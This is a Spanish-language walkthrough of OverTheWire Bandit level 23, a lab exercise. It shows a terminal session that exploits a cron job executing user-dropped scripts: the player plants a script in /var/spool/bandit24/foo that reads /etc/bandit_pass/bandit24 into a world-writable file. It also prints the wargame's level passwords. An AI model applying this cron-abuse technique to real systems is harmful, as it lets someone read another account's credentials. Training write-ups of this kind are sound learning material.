## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
**bandit.labs.overthewire.org**
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución
```
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit_bandit24
cat: /etc/cron.d/cronjob_bandit_bandit24: No such file or directory
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mktemp -d
/tmp/tmp.U8vV3hV7hE
bandit23@bandit:~$ cd /tmp/tmp.U8vV3hV7hE
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ /tmp/tmp.U8vV3hV7hE nano bandit24_pass.sh
-bash: /tmp/tmp.U8vV3hV7hE: Is a directory
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ nano bandit24_pass.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls
bandit24_pass.sh
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ chmod +rx bandit24_pass.sh
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ chmod 777 /tmp/tmp.U8vV3hV7hE
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ touch password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ chmod +rwx password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls -la
total 408
drwxrwxrwx    2 bandit23 bandit23   4096 Feb 29 13:16 .
drwxrwx-wt 1098 root     root     405504 Feb 29 13:16 ..
-rwxrwxr-x    1 bandit23 bandit23     73 Feb 29 13:15 bandit24_pass.sh
-rwxrwxr-x    1 bandit23 bandit23      0 Feb 29 13:16 password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cp bandit24_pass.sh /var/spool/bandit24/bandit24_pass.sh
cp: cannot create regular file '/var/spool/bandit24/bandit24_pass.sh': Operation not permitted
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls /var/spool/bandit24/
foo
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls -la /var/spool/bandit24/
total 12
dr-xr-x---  3 bandit24 bandit23 4096 Oct  5 06:19 .
drwxr-xr-x  5 root     root     4096 Oct  5 06:19 ..
drwxrwx-wx 92 root     bandit24 4096 Feb 29 13:18 foo
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cp bandit24_pass.sh /var/spool/bandit24/bandit24_pass.sh
cp: cannot create regular file '/var/spool/bandit24/bandit24_pass.sh': Operation not permitted
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls -la
total 408
drwxrwxrwx    2 bandit23 bandit23   4096 Feb 29 13:16 .
drwxrwx-wt 1104 root     root     405504 Feb 29 13:19 ..
-rwxrwxr-x    1 bandit23 bandit23     73 Feb 29 13:15 bandit24_pass.sh
-rwxrwxr-x    1 bandit23 bandit23      0 Feb 29 13:16 password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cp bandit24_pass.sh /var/spool/bandit24/foo/bandit24_pass.sh
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cat password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ nano bandit24_pass.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ nano bandit24_pass.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cp bandit24_pass.sh /var/spool/bandit24/foo/bandit24_pass.sh
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cat password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls -l
total 4
-rwxrwxr-x 1 bandit23 bandit23 73 Feb 29 13:23 bandit24_pass.sh
-rwxrwxr-x 1 bandit23 bandit23  0 Feb 29 13:16 password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ chmod 777 password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ ls -l
total 4
-rwxrwxr-x 1 bandit23 bandit23 73 Feb 29 13:23 bandit24_pass.sh
-rwxrwxrwx 1 bandit23 bandit23  0 Feb 29 13:16 password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cat password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ chmod +rx bandit24_pass.sh
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cat bandit24_pass.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.U8vV3hV7hE/password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cat password
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cp bandit24_pass.sh /var/spool/bandit24/foo/bandit24_pass.sh
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/tmp.U8vV3hV7hE$ exit
```

## Notas adicionales
- el comando mktemp -d nos crea un directorio temporal en el cual podemos estar trabajando

## Referencias

